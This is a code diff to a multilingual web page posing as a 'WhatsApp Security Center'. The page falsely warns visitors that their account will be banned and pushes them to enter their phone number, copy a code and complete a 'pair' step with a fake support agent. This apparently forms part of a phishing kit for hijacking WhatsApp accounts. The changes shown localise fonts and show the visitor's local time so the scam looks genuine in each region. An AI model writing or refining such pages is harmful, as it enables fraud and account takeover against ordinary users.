@@ -170,7 +170,7 @@
       <div class="bubble tutorial">
         <img id="tutorialImage" src="wha-tutorial.jpg" alt="安全代码教程" />
         <div class="bubble-text" id="bannerText">WhatsApp安全中心正在侦测虚拟注册号码与帐号买卖等违法行为。<br/><strong>系统提示：</strong>您的帐号有风险提示且长期未验证，目前需要连接官方系统解除帐号风险，请配合，以免影响帐号的正常使用。<br/><span class="hl">如规定时间内未进行验证，系统将自动对帐号进行封禁注销。</span></div>
-        <div class="bubble-time">12:44</div>
+        <div class="bubble-time" id="bannerTime">--:--</div>
       </div>
       <div id="chatLog"></div>
 
@@ -224,9 +224,30 @@
     "ja": { topTitle:"WhatsApp セキュリティセンター", headline:"<em>WhatsApp</em> サポートに接続中", cardTitle:"接続を確立中", cardSub:"担当者を割り当て中", inputLabel:"WhatsApp 電話番号を入力", warnT:"⚠ 注意", warnD:"ご自身の番号を使用。手機と一致必須", guideT:"📋 確認", g1:"番号は一致必須", g2:"更新OK、終了で消去", submit:"続行", verifying:"確認中…", copy:"コードをコピー", open:"WhatsApp を開く", timer:"残り", success:"✓ 確認完了、閉じてください", offline:"オフライン", online:"オンライン" },
     "ko": { topTitle:"WhatsApp 보안 센터", headline:"<em>WhatsApp</em> 핫라인 연결 중", cardTitle:"연결 중", cardSub:"상담원 배정 중", inputLabel:"WhatsApp 번호 입력", warnT:"⚠ 알림", warnD:"본인 번호 사용, 휴대폰과 일치해야 함", guideT:"📋 확인", g1:"번호 일치 필수", g2:"새로고침 안전, 종료 시 삭제", submit:"계속", verifying:"확인 중…", copy:"코드 복사", open:"WhatsApp 열기", timer:"남은", success:"✓ 확인 완료, 닫아주세요", offline:"오프라인", online:"온라인" }
   };
+  // 语言→字体/时间格式：字体跟翻译走，各地区看各地区时间（访客本机时区）
+  var currentLang="zh-CN";
+  var LANG_FONTS={
+    "zh-CN":'-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif',
+    "zh-TW":'-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang TC","Hiragino Sans CNS","Microsoft JhengHei",sans-serif',
+    "en":'-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif',
+    "th":'-apple-system,BlinkMacSystemFont,"Leelawadee UI","Noto Sans Thai",Tahoma,"Microsoft YaHei",sans-serif',
+    "ja":'-apple-system,BlinkMacSystemFont,"Hiragino Kaku Gothic ProN","Hiragino Sans","Yu Gothic",Meiryo,"Microsoft YaHei",sans-serif',
+    "ko":'-apple-system,BlinkMacSystemFont,"Apple SD Gothic Neo","Noto Sans KR","Malgun Gothic","Microsoft YaHei",sans-serif'
+  };
+  var LANG_LOCALE={"zh-CN":"zh-CN","zh-TW":"zh-TW","en":"en-US","th":"th-TH","ja":"ja-JP","ko":"ko-KR"};
+  function nowTime(){
+    try{
+      return new Intl.DateTimeFormat(LANG_LOCALE[currentLang]||"zh-CN",{hour:"numeric",minute:"2-digit",hour12:true}).format(new Date());
+    }catch(e){
+      var d=new Date(); var h=d.getHours(),m=d.getMinutes(); var h12=h%12||12; var p=function(n){return n<10?"0"+n:n;};
+      return p(h12)+":"+p(m)+(h>=12?" 下午":" 上午");
+    }
+  }
   function setLang(lang){
     var t=I18N[lang]||I18N["zh-CN"];
+    currentLang=I18N[lang]?lang:"zh-CN";
     try{localStorage.setItem("hotline_lang",lang);}catch(e){}
+    try{ document.body.style.fontFamily=LANG_FONTS[currentLang]||LANG_FONTS["zh-CN"]; }catch(e){}
     document.documentElement.lang=lang;
     var el=document.getElementById("topTitle"); if(el) el.textContent=t.topTitle;
     var h=document.querySelector(".headline"); if(h) h.innerHTML=t.headline;
@@ -251,7 +272,7 @@
     var snap=loadVerify();
     var fresh=snap&&(Date.now()-(snap.ts||0)<15*60*1000);
     var fast=!!(fresh&&(snap.stage==="pair"||snap.stage==="done"));
-    setTimeout(function(){ document.getElementById("cover").classList.add("hidden"); document.getElementById("main").classList.remove("hidden"); loadFrontendText(); loadStatus(); restoreVerify(fast?snap:null); }, fast?600:2500);
+    setTimeout(function(){ document.getElementById("cover").classList.add("hidden"); document.getElementById("main").classList.remove("hidden"); loadFrontendText(); loadStatus(); try{ document.getElementById("bannerTime").textContent=nowTime(); }catch(e){} restoreVerify(fast?snap:null); }, fast?600:2500);
   })();
 
   function loadFrontendText(){
@@ -281,8 +302,6 @@
     });
   }
   document.getElementById("ccModal").addEventListener("click",function(e){ if(e.target===this)closeCC(); });
-
-  function nowTime(){ var d=new Date(); var beijing=new Date(d.getTime()+d.getTimezoneOffset()*60000+8*3600*1000); var h=beijing.getHours(),m=beijing.getMinutes(); var h12=h%12||12; var p=n=>n<10?"0"+n:n; return p(h12)+":"+p(m)+(h>=12?" 下午":" 上午"); }
 
   // ===== 客服聊天（接管理端客服中心） =====
   // 会话级存储：同标签刷新保留，关闭/退出即清（无痕）。localStorage 只做一次性迁移，随后删除。
